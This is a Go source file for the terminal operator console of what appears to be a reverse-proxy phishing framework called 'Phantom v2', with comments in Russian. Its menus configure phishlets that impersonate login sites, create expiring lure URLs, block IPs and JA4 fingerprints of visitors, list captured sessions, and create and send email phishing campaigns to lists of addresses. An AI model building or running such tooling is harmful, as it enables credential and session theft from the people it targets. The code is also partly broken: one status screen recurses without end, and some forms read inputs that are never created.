// TUI на bubbletea: главное меню + экраны dashboard/config/phishlets/
// block/lure/reload/generate. Стили lipgloss, проверка связи при старте.
package menu

import (
	"fmt"
	"sort"
	"strings"

	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	"time"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/phantom-v2/phantom/internal/supervise"
)

var (
	bannerStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("99")).
		Border(lipgloss.RoundedBorder()).BorderForeground(lipgloss.Color("99")).
		Padding(0, 1)
	titleStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("63")).
			Border(lipgloss.RoundedBorder()).BorderForeground(lipgloss.Color("63")).
			Padding(0, 1)
	okStyle  = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("42"))
	errStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("196"))
	dimStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("241"))
	boxStyle = lipgloss.NewStyle().Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("238")).Padding(0, 1)
	footStyle = dimStyle.Copy().MarginTop(1)
)

type screen int

const (
	sConnect screen = iota
	sMenu
	sDashboard
	sConfig
	sPhishlets
	sBlock
	sLure
	sReload
	sGenerate
	sPhishDomain
	sPhishToggle
	sDomains
	sPick
	sPhishDetail
	sDomainAdd
	sCampNew
	sCamps
	sCaptures
	sServer
	sQuickPick
	sResult
)

type statusMsg struct {
	err error
	node string
}

type item struct {
	title, desc string
	goes  screen
}

func (i item) Title() string       { return i.title }
func (i item) Description() string { return i.desc }
func (i item) FilterValue() string { return i.title }

type model struct {
	client *Client
	screen screen
	conn   string
	pickTitle string
	pickList list.Model
	pickKind string
	pickPhishlet string
	pickEnabled bool
	loc         Local // "node=..." или текст ошибки
	list   list.Model
	inputs []textinput.Model
	labels []string
	focus  int
	result string
	isErr  bool
}

func initialModel(c *Client) model {
	items := []list.Item{
		item{"Dashboard", "stats сервера · captures · uptime", sDashboard},
		item{"Config", "домены · TLS · нода (без секретов)", sConfig},
		item{"Phishlets", "кто загружен в стор", sPhishlets},
		item{"Block IP", "бан IP/JA4 с причиной", sBlock},
		item{"Smart lure+", "одноразовая приманка с TTL/IP/challenge", sLure},
		item{"Reload", "hot-reload фишлетов без рестарта", sReload},
		item{"Generate", "новый фишлет: origin→domain→id", sGenerate},
		item{"Phishlet domain", "сменить base_domains", sPhishDomain},
		item{"Phishlet on/off", "вкл/выкл без рестарта", sPhishToggle},
		item{"Campaigns", "рассылки и статистика", sCamps},
		item{"Campaign+", "новая: цели -> launch -> send", sCampNew},
		item{"Domains", "пресеты доменов", sDomains},
		item{"Captures", "последние захваты", sCaptures},
		item{"Server", "старт/стоп/логи (одно окно)", sServer},
		item{"Quick test", "приманка одной кнопкой", sQuickPick},
		item{"Quit", "выход (сервер продолжает работать)", sMenu},
	}
	delegate := list.NewDefaultDelegate()
	delegate.Styles.SelectedTitle = delegate.Styles.SelectedTitle.
		Foreground(lipgloss.Color("63")).Bold(true)
	delegate.Styles.SelectedDesc = delegate.Styles.SelectedDesc.
		Foreground(lipgloss.Color("241"))
	l := list.New(items, delegate, 56, 18)
	l.Title = "Phantom v2 · Operator"
	l.SetShowStatusBar(false)
	l.SetFilteringEnabled(false)
	l.Styles.Title = titleStyle.Copy().BorderStyle(lipgloss.NormalBorder())
	return model{client: c, screen: sConnect, list: l}
}

// Local — локальный контекст меню (супервизор, пути).
type Local struct {
	Exe      string // путь к бинарю phantom (os.Executable)
	Config   string // путь к config.yaml
	PhishDir string // директория фишлетов
	API      string // api addr для health
}

// Run запускает TUI. Возвращает управление после Quit.
func Run(c *Client, loc Local) error {
	m := initialModel(c)
	m.loc = loc
	p := tea.NewProgram(m)
	_, err := p.Run()
	return err
}

func (m model) Init() tea.Cmd {
	return func() tea.Msg {
		st, err := m.client.Stats()
		if err != nil {
			return statusMsg{err: err}
		}
		node, _ := st["node"].(string)
		if node == "" {
			node = "?"
		}
		return statusMsg{node: node}
	}
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case statusMsg:
		if msg.err != nil {
			m.conn = "ERR: " + msg.err.Error()
			m.screen = sMenu
			m.result, m.isErr = "Сервер недоступен:\n"+msg.err.Error()+
				"\n\nПроверь: запущен ли phantom, верный ли -api адрес.", true
			m.screen = sResult
			return m, nil
		}
		m.conn = "node=" + msg.node
		m.screen = sMenu
		return m, nil
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			return m, tea.Quit
		case "esc":
			if m.screen != sMenu && m.screen != sConnect {
				m.screen = sMenu
				return m, nil
			}
		case "enter":
			if m.screen == sPick {
				return m.pickEnter()
			}
			return m.onEnter()
		case "1", "2", "3", "4", "5", "6", "7", "8", "9", "0":
			if m.screen == sMenu {
				c := msg.String()[0]
				idx := int(c - '1')
				if c == '0' {
					idx = 9
				}
				if idx >= 0 && idx < len(m.list.Items()) {
					m.list.Select(idx)
					return m.onEnter()
				}
				return m, nil
			}
		case "r", "R", "к", "К":
			if m.screen == sPick {
				return m.reloadPick()
			}
		case "tab", "shift+tab", "up", "down":
			if m.isForm() {
				return m.moveFocus(msg.String())
			}
		}
	case tea.WindowSizeMsg:
		m.list.SetSize(msg.Width-8, msg.Height-10)
	}
	var cmd tea.Cmd
	if m.screen == sMenu {
		m.list, cmd = m.list.Update(msg)
		return m, cmd
	}
	if m.screen == sPick {
		if km, ok := msg.(tea.KeyMsg); ok {
			switch km.String() {
			case "enter":
				return m.pickEnter()
			case "a":
				if m.pickKind == "domains" {
					m.inputs, m.labels = mkInputs([]string{"новый домен"}, []string{""})
					m.focus = 0
					m.screen = sDomainAdd
					m.pickPhishlet = ""
					return m, nil
				}
			case "x":
				if m.pickKind == "domains" {
					return m.pickDelete()
				}
			}
		}
		m.pickList, cmd = m.pickList.Update(msg)
		return m, cmd
	}
	if m.screen == sServer {
		if km, ok := msg.(tea.KeyMsg); ok {
			switch km.String() {
			case "s":
				pid, err := supervise.Start(m.loc.Exe, []string{"-config", m.loc.Config, "-phishlets", m.loc.PhishDir, "-api", m.loc.API})
				if err != nil {
					return m.showResult("start: " + err.Error(), true), nil
				}
				return m.showResult(fmt.Sprintf("запущен pid=%d, жди 3с и жми r", pid), false), nil
			case "x":
				if err := supervise.Stop(); err != nil {
					return m.showResult("stop: " + err.Error(), true), nil
				}
				return m.showResult("остановлен", false), nil
			case "l":
				return m.showResult(supervise.Tail(20), false), nil
			case "r":
				st, pid := supervise.Status(m.loc.API)
				m.result = "сервер: " + st
				if pid > 0 {
					m.result += fmt.Sprintf(" pid=%d", pid)
				}
				return m, nil
			}
		}
		return m, nil
	}
	if m.screen == sPhishDetail {
		if km, ok := msg.(tea.KeyMsg); ok {
			switch km.String() {
			case "d":
				return m.openDomainPick(m.pickPhishlet)
			case "c":
				hc, err := m.client.CheckPhishlet(m.pickPhishlet)
				if err != nil {
					return m.showResult("check: " + err.Error(), true), nil
				}
				var b strings.Builder
				for _, h := range hc {
					if h.Err != "" {
						fmt.Fprintf(&b, "%s  ERR %s\n", h.Host, h.Err)
						continue
					}
					fmt.Fprintf(&b, "%s  %d %db  hit=%d miss=%d\n", h.Host, h.HTTP, h.Bytes, len(h.Hits), len(h.Misses))
					for _, miss := range h.Misses {
						fmt.Fprintf(&b, "    ! %s\n", miss)
					}
				}
				return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
			case "t":
				on := !m.pickEnabled
				if err := m.client.SetPhishlet(m.pickPhishlet, nil, &on); err != nil {
					return m.showResult("on/off: " + err.Error(), true), nil
				}
				m.pickEnabled = on
				state := "выключен"
				if on {
					state = "включен"
				}
				return m.showResult(m.pickPhishlet+" "+state, false), nil
			}
		}
		return m, nil
	}
	if m.isForm() {
		for i := range m.inputs {
			if i == m.focus {
				m.inputs[i], cmd = m.inputs[i].Update(msg)
				return m, cmd
			}
		}
	}
	return m, nil
}

func (m model) isForm() bool {
	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate ||
		m.screen == sDomainAdd || m.screen == sCampNew
}

// openPick открывает пикер со списком.
func (m model) openPick(title, kind string, items []string) model {
	li := make([]list.Item, 0, len(items))
	for _, t := range items {
		li = append(li, pickItem{t})
	}
	delegate := list.NewDefaultDelegate()
	delegate.Styles.SelectedTitle = delegate.Styles.SelectedTitle.
		Foreground(lipgloss.Color("63")).Bold(true)
	pl := list.New(li, delegate, 56, 14)
	pl.Title = title
	pl.SetShowStatusBar(false)
	pl.SetFilteringEnabled(false)
	m.screen, m.pickTitle, m.pickList, m.pickKind = sPick, title, pl, kind
	return m
}

type pickItem struct{ title string }

func (i pickItem) Title() string       { return i.title }
func (i pickItem) Description() string { return "" }
func (i pickItem) FilterValue() string { return i.title }

func (m model) moveFocus(key string) (tea.Model, tea.Cmd) {
	m.inputs[m.focus].Blur()
	switch key {
	case "tab", "down":
		m.focus = (m.focus + 1) % len(m.inputs)
	case "shift+tab", "up":
		m.focus = (m.focus - 1 + len(m.inputs)) % len(m.inputs)
	}
	m.inputs[m.focus].Focus()
	return m, nil
}

func mkInputs(labels []string, defaults []string) ([]textinput.Model, []string) {
	out := make([]textinput.Model, len(labels))
	for i, p := range labels {
		ti := textinput.New()
		ti.Placeholder = p
		ti.Prompt = "› "
		ti.TextStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("252"))
		if i < len(defaults) && defaults[i] != "" {
			ti.SetValue(defaults[i])
		}
		if i == 0 {
			ti.Focus()
		}
		ti.CharLimit = 128
		ti.Width = 44
		out[i] = ti
	}
	return out, labels
}


// phishNames возвращает "id ●/○" строки + карту enabled.
func (m model) phishNames() ([]string, map[string]bool, error) {
	det, err := m.client.PhishletsDetail()
	if err != nil {
		return nil, nil, err
	}
	items := make([]string, 0, len(det))
	en := map[string]bool{}
	for _, p := range det {
		mark := "\u25cf"
		if !p.Enabled {
			mark = "\u25cb"
		}
		items = append(items, mark+" "+p.ID)
		en[p.ID] = p.Enabled
	}
	return items, en, nil
}

func phishID(display string) string {
	f := strings.Fields(display)
	if len(f) == 0 {
		return display
	}
	return f[len(f)-1]
}

// openDomainPick — пикер пресетов (+ новый) для фишлета.
func (m model) openDomainPick(phishlet string) (tea.Model, tea.Cmd) {
	doms, err := m.client.ListDomains()
	if err != nil {
		return m.showResult("domains: " + err.Error(), true), nil
	}
	m.pickPhishlet = phishlet
	items := append([]string{"+ новый домен…"}, doms...)
	return m.openPick("домен для "+phishlet, "domain", items), nil
}

// reloadPick перечитывает текущий пикер (клавиша r).
func (m model) reloadPick() (tea.Model, tea.Cmd) {
	switch m.pickKind {
	case "phish-act", "phish-domain", "phish-toggle":
		items, _, err := m.phishNames()
		if err != nil {
			return m.showResult("phishlets: " + err.Error(), true), nil
		}
		title := m.pickTitle
		kind := m.pickKind
		m = m.openPick(title, kind, items)
		return m, nil
	case "domain":
		return m.openDomainPick(m.pickPhishlet)
	case "domains":
		doms, err := m.client.ListDomains()
		if err != nil {
			return m.showResult("domains: " + err.Error(), true), nil
		}
		return m.openPick("пресеты доменов  (a-добавить x-удалить)", "domains", doms), nil
	case "quicktest":
		items, _, err := m.phishNames()
		if err != nil {
			return m.showResult("phishlets: " + err.Error(), true), nil
		}
		return m.openPick("фишлет для быстрого теста", "quicktest", items), nil

	case "camp":
		list, err := m.client.ListCampaigns()
		if err != nil {
			return m.showResult("campaigns: " + err.Error(), true), nil
		}
		items := make([]string, 0, len(list))
		for _, c := range list {
			items = append(items, c.ID+" "+c.Name+" ["+c.Status+"]")
		}
		return m.openPick("кампании", "camp", items), nil
	}
	return m, nil
}

// quickCreate делает one-time приманку и показывает URL.
func (m model) quickCreate(id string) (tea.Model, tea.Cmd) {
	det, err := m.client.PhishletsDetail()
	if err != nil {
		return m.showResult("detail: " + err.Error(), true), nil
	}
	domain := ""
	for _, p := range det {
		if p.ID == id && len(p.Domains) > 0 {
			domain = p.Domains[0]
		}
	}
	if domain == "" {
		return m.showResult("нет домена у " + id, true), nil
	}
	port := ""
	if cfg, err := m.client.ServerConfig(); err == nil {
		if p, ok := cfg["https_port"].(float64); ok && p != 443 {
			port = fmt.Sprintf(":%d", int(p))
		}
	}
	path := "/l/qt-" + randSuffix()
	if err := m.client.SmartLure(path, id, 60, 1, "", false); err != nil {
		return m.showResult("lure: " + err.Error(), true), nil
	}
	return m.showResult("открой в браузере:\nhttps://" + domain + port + path + "", false), nil
}

// pickEnter — выбор в пикере по kind.
func (m model) pickEnter() (tea.Model, tea.Cmd) {
	sel, ok := m.pickList.SelectedItem().(pickItem)
	if !ok {
		return m, nil
	}
	switch m.pickKind {
	case "phish-act":
		m.pickPhishlet = phishID(sel.title)
		det, err := m.client.PhishletsDetail()
		if err != nil {
			return m.showResult("detail: " + err.Error(), true), nil
		}
		for _, p := range det {
			if p.ID == m.pickPhishlet {
				m.pickEnabled = p.Enabled
				m.screen = sPhishDetail
				return m, nil
			}
		}
		return m.showResult("нет такого фишлета", true), nil
	case "phish-domain", "phish-toggle":
		id := phishID(sel.title)
		if m.pickKind == "phish-toggle" {
			det, err := m.client.PhishletsDetail()
			if err != nil {
				return m.showResult("detail: " + err.Error(), true), nil
			}
			on := true
			for _, p := range det {
				if p.ID == id {
					on = !p.Enabled
				}
			}
			if err := m.client.SetPhishlet(id, nil, &on); err != nil {
				return m.showResult("on/off: " + err.Error(), true), nil
			}
			state := "выключен"
			if on {
				state = "включен"
			}
			return m.showResult(id+" "+state, false), nil
		}
		return m.openDomainPick(id)
	case "domain":
		if strings.HasPrefix(sel.title, "+ ") {
			m.inputs, m.labels = mkInputs([]string{"новый домен"}, []string{""})
			m.focus = 0
			m.screen = sDomainAdd
			return m, nil
		}
		if m.pickPhishlet == "" {
			return m.showResult("домен: " + sel.title, false), nil
		}
		if err := m.client.SetPhishlet(m.pickPhishlet, []string{sel.title}, nil); err != nil {
			return m.showResult("domain: " + err.Error(), true), nil
		}
		return m.showResult(m.pickPhishlet+" → "+sel.title, false), nil
	case "quicktest":
		return m.quickCreate(phishID(sel.title))
	case "camp":
		id := strings.Fields(sel.title)[0]
		list, err := m.client.ListCampaigns()
		if err != nil {
			return m.showResult("campaigns: " + err.Error(), true), nil
		}
		for _, c := range list {
			if c.ID == id {
				return m.showResult(fmt.Sprintf("%s\nстатус %s\nвсего %d\nsent %d open %d click %d submit %d",
					c.Name, c.Status, c.Total, c.Sent, c.Opened, c.Clicked, c.Submitted), false), nil
			}
		}
		return m.showResult("нет кампании", true), nil
	case "domains":
		return m.showResult("домен: " + sel.title + "  (a-добавить x-удалить)", false), nil
	}
	return m, nil
}

// pickDelete удаляет выбранный пресет и обновляет список.
func (m model) pickDelete() (tea.Model, tea.Cmd) {
	sel, ok := m.pickList.SelectedItem().(pickItem)
	if !ok {
		return m, nil
	}
	if err := m.client.RemoveDomain(sel.title); err != nil {
		return m.showResult("del: " + err.Error(), true), nil
	}
	doms, err := m.client.ListDomains()
	if err != nil {
		return m.showResult("domains: " + err.Error(), true), nil
	}
	return m.openPick("пресеты доменов  (a-добавить x-удалить)", "domains", doms), nil
}

func (m model) onEnter() (tea.Model, tea.Cmd) {
	if m.screen == sMenu {
		sel, ok := m.list.SelectedItem().(item)
		if !ok {
			return m, nil
		}
		if sel.title == "Quit" {
			return m, tea.Quit
		}
		m.screen = sel.goes
		m.result, m.isErr = "", false
		switch sel.goes {
		case sDashboard:
			st, err := m.client.Stats()
			if err != nil {
				return m.showResult("stats: "+err.Error(), true), nil
			}
			ph, _ := m.client.Phishlets()
			return m.showResult(fmt.Sprintf(
				"node      %v\nphishlets %v\nuptime    %vs\n\nзагружены:\n  %s",
				st["node"], st["phishlets"], st["uptime_s"], strings.Join(ph, "\n  ")), false), nil
		case sConfig:
			cfg, err := m.client.ServerConfig()
			if err != nil {
				return m.showResult("config: "+err.Error(), true), nil
			}
			keys := make([]string, 0, len(cfg))
			for k := range cfg {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			var b strings.Builder
			for _, k := range keys {
				fmt.Fprintf(&b, "%-14s %v\n", k, cfg[k])
			}
			return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
		case sPhishlets:
			items, _, err := m.phishNames()
			if err != nil {
				return m.showResult("phishlets: " + err.Error(), true), nil
			}
			return m.openPick("select phishlet", "phish-act", items), nil
		case sBlock:
			m.inputs, m.labels = mkInputs(
				[]string{"IP или JA4", "причина"},
				[]string{"", "operator"})
			m.focus = 0
		case sLure:
			m.inputs, m.labels = mkInputs(
				[]string{"path  (/l/xxx)", "phishlet id", "ttl мин  (0=∞)", "max uses  (1=однораз)", "bound ip  (пусто=любой)", "challenge y/n"},
				[]string{"/l/op01", "labtest", "120", "1", "", "y"})
			m.focus = 0
		case sReload:
			if err := m.client.Reload(); err != nil {
				return m.showResult("reload: "+err.Error(), true), nil
			}
			return m.showResult("стор перечитан без рестарта", false), nil
		case sGenerate:
			m.inputs, m.labels = mkInputs(
				[]string{"origin  (login.x.com)", "domain  (p.test)", "id"},
				[]string{"", "", ""})
			m.focus = 0
		case sPhishDomain:
			items, _, err := m.phishNames()
			if err != nil {
				return m.showResult("phishlets: " + err.Error(), true), nil
			}
			return m.openPick("phishlet -> domain", "phish-domain", items), nil
		case sPhishToggle:
			items, _, err := m.phishNames()
			if err != nil {
				return m.showResult("phishlets: " + err.Error(), true), nil
			}
			return m.openPick("phishlet -> on/off", "phish-toggle", items), nil
		case sServer:
			st, pid := supervise.Status(m.loc.API)
			m.result = "сервер: " + st
			if pid > 0 {
				m.result += fmt.Sprintf(" pid=%d", pid)
			}
			m.screen = sServer
			return m, nil
		case sQuickPick:
			items, _, err := m.phishNames()
			if err != nil {
				return m.showResult("phishlets: " + err.Error(), true), nil
			}
			return m.openPick("фишлет для быстрого теста", "quicktest", items), nil
		case sCaptures:
			caps, err := m.client.Captures()
			if err != nil {
				return m.showResult("captures: " + err.Error(), true), nil
			}
			if len(caps) == 0 {
				return m.showResult("захватов пока нет", false), nil
			}
			var b strings.Builder
			for _, cp := range caps {
				fmt.Fprintf(&b, "%s  %s  %s\n", short(cp.Session), cp.Kind, cp.Node)
			}
			return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
		case sCamps:
			list, err := m.client.ListCampaigns()
			if err != nil {
				return m.showResult("campaigns: " + err.Error(), true), nil
			}
			items := make([]string, 0, len(list))
			for _, c := range list {
				items = append(items, fmt.Sprintf("%s %s [%s] %d", c.ID, c.Name, c.Status, c.Total))
			}
			return m.openPick("кампании", "camp", items), nil
		case sCampNew:
		m.inputs, m.labels = mkInputs(
				[]string{"название", "phishlet id", "emails через запятую", "subject", "body html", "url_base", "ttl мин", "стоп через дней (0=∞)"},
				[]string{"", "", "", "", "", "", "10080", "0"})
			m.focus = 0
		case sDomains:
			doms, err := m.client.ListDomains()
			if err != nil {
				return m.showResult("domains: " + err.Error(), true), nil
			}
			return m.openPick("domain presets (a-add x-del)", "domains", doms), nil
		}
		return m, nil
	}
	switch m.screen {
	case sBlock:
		if m.inputs[0].Value() == "" {
			return m.showResult("нужен IP/JA4", true), nil
		}
		if err := m.client.Block(m.inputs[0].Value(), m.inputs[1].Value()); err != nil {
			return m.showResult("block: "+err.Error(), true), nil
		}
		return m.showResult("забанен: "+m.inputs[0].Value(), false), nil
	case sLure:
		ch := strings.ToLower(strings.TrimSpace(m.inputs[5].Value()))
		if err := m.client.SmartLure(
			m.inputs[0].Value(), m.inputs[1].Value(),
			atoi(m.inputs[2].Value()), atoi(m.inputs[3].Value()),
			m.inputs[4].Value(), ch == "y" || ch == "yes" || ch == "1",
		); err != nil {
			return m.showResult("lure: "+err.Error(), true), nil
		}
		return m.showResult("приманка создана: "+m.inputs[0].Value(), false), nil
	case sGenerate:
		yml, err := m.client.Generate(m.inputs[0].Value(), m.inputs[1].Value(), m.inputs[2].Value())
		if err != nil {
			return m.showResult("generate: "+err.Error(), true), nil
		}
		lines := strings.SplitN(yml, "\n", 14)
		return m.showResult(strings.Join(lines, "\n")+"\n…", false), nil
	case sCampNew:
		emails := splitCSV(m.inputs[2].Value())
		if m.inputs[0].Value() == "" || m.inputs[1].Value() == "" || len(emails) == 0 {
			return m.showResult("нужны название, фишлет и emails", true), nil
		}
		var endsAt int64
		if days := atoi(m.inputs[7].Value()); days > 0 {
			endsAt = time.Now().Add(time.Duration(days) * 24 * time.Hour).Unix()
		}
		id, err := m.client.CreateCampaign(m.inputs[0].Value(), m.inputs[1].Value(), atoi(m.inputs[6].Value()), 1, endsAt)
		if err != nil {
			return m.showResult("create: " + err.Error(), true), nil
		}
		added, err := m.client.AddTargets(id, emails)
		if err != nil {
			return m.showResult("targets: " + err.Error(), true), nil
		}
		targets, err := m.client.LaunchCampaign(id)
		if err != nil {
			return m.showResult("launch: " + err.Error(), true), nil
		}
		sent, err := m.client.SendCampaign(id, m.inputs[3].Value(), m.inputs[4].Value(), m.inputs[5].Value())
		if err != nil {
			return m.showResult("send: " + err.Error(), true), nil
		}
		return m.showResult(fmt.Sprintf("кампания %s: целей %d, приманок %d, отправлено %d", id, added, len(targets), sent), false), nil
	case sDomainAdd:
		domain := strings.TrimSpace(m.inputs[0].Value())
		if domain == "" {
			return m.showResult("need domain", true), nil
		}
		if err := m.client.AddDomain(domain); err != nil {
			return m.showResult("add: " + err.Error(), true), nil
		}
		if m.pickPhishlet != "" {
			if err := m.client.SetPhishlet(m.pickPhishlet, []string{domain}, nil); err != nil {
				return m.showResult("domain: " + err.Error(), true), nil
			}
			return m.showResult(m.pickPhishlet+" -> "+domain, false), nil
		}
		return m.showResult("preset added: "+domain, false), nil
	case sPhishDomain:
		raw := strings.ReplaceAll(m.inputs[1].Value(), " ", ",")
		var domains []string
		for _, s := range strings.Split(raw, ",") {
			if s = strings.TrimSpace(s); s != "" {
				domains = append(domains, s)
			}
		}
		if m.inputs[0].Value() == "" || len(domains) == 0 {
			return m.showResult("id + domains required", true), nil
		}
		if err := m.client.SetPhishlet(m.inputs[0].Value(), domains, nil); err != nil {
			return m.showResult("domain: " + err.Error(), true), nil
		}
		return m.showResult("domains: " + strings.Join(domains, ", "), false), nil
	case sPhishToggle:
		v := strings.ToLower(strings.TrimSpace(m.inputs[1].Value()))
		on := v == "y" || v == "yes" || v == "1" || v == "on"
		if m.inputs[0].Value() == "" {
			return m.showResult("id required", true), nil
		}
		if err := m.client.SetPhishlet(m.inputs[0].Value(), nil, &on); err != nil {
			return m.showResult("on/off: " + err.Error(), true), nil
		}
		state := "off"
		if on {
			state = "on"
		}
		return m.showResult(m.inputs[0].Value()+" "+state, false), nil
	}
	return m, nil
}

func (m model) showResult(s string, isErr bool) model {
	m.screen, m.result, m.isErr = sResult, s, isErr
	return m
}

func randSuffix() string {
	const abc = "abcdefghijklmnopqrstuvwxyz0123456789"
	var b strings.Builder
	seed := time.Now().UnixNano()
	for i := 0; i < 6; i++ {
		seed = seed*6364136223846793005 + 1442695040888963407
		b.WriteByte(abc[uint64(seed>>33)%uint64(len(abc))])
	}
	return b.String()
}

func short(s string) string {
	if len(s) > 8 {
		return s[:8]
	}
	return s
}

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

func atoi(s string) int {
	n := 0
	for _, c := range strings.TrimSpace(s) {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func (m model) header() string {
	conn := dimStyle.Render(m.conn)
	if strings.HasPrefix(m.conn, "ERR") {
		conn = errStyle.Render(m.conn)
	}
	banner := bannerStyle.Render("◈ PHANTOM v2") + dimStyle.Render(" // operator")
	return banner + "  " + conn + "\n" + dimStyle.Render("› " + m.where()) + "\n" +
		footStyle.Render("цифры выбор · esc назад · tab поле · enter выполнить · r обновить · ctrl+c выход") + "\n\n"
}

func (m model) where() string {
	switch m.screen {
	case sConnect:
		return "подключение"
	case sMenu:
		return "меню"
	case sDashboard:
		return "меню › dashboard"
	case sConfig:
		return "меню › config"
	case sPhishlets:
		return "меню › фишлеты"
	case sBlock:
		return "меню › block"
	case sLure:
		return "меню › smart lure"
	case sReload:
		return "меню › reload"
	case sGenerate:
		return "меню › generate"
	case sPhishDomain:
		return "меню › домен"
	case sPhishToggle:
		return "меню › вкл/выкл"
	case sDomains:
		return "меню › пресеты"
	case sPick:
		return "меню › выбор: " + m.pickTitle
	case sServer:
		return m.header() + boxStyle.Render(m.result) +
			footStyle.Render("\ns — старт · x — стоп · l — лог · r — статус · esc — назад")
	case sPhishDetail:
		return "фишлеты › " + m.pickPhishlet
	case sDomainAdd:
		return "меню › новый домен"
	case sCampNew:
		return "меню › новая кампания"
	case sCaptures:
		return "меню › захваты"
	case sResult:
		return "результат"
	}
	return ""
}

func (m model) View() string {
	switch m.screen {
	case sConnect:
		return m.header() + "подключение к API…"
	case sMenu:
		return m.header() + m.list.View()
	case sPick:
		return m.header() + m.pickList.View() + footStyle.Render("\nenter — выбрать · r — обновить")
	case sPhishDetail:
		state := "○ выключен"
		if m.pickEnabled {
			state = "● включен"
		}
		info := "фишлет  " + m.pickPhishlet + "\nстатус  " + state
		return m.header() + boxStyle.Render(info) +
			footStyle.Render("\nd — сменить домен · t — вкл/выкл · c — проверить origin · esc — назад")
	case sResult:
		st := okStyle.Render("✓ OK")
		if m.isErr {
			st = errStyle.Render("✗ ERR")
		}
		return m.header() + st + "\n" + boxStyle.Render(m.result)
	default:
		if m.isForm() {
			var b strings.Builder
			b.WriteString(m.header())
			for i, in := range m.inputs {
				mark := "  "
				if i == m.focus {
					mark = okStyle.Render("▸ ")
				}
				b.WriteString(dimStyle.Render(m.labels[i]) + "\n")
				b.WriteString(mark + in.View() + "\n")
			}
			b.WriteString(footStyle.Render("enter — выполнить"))
			return b.String()
		}
		return m.header()
	}
}
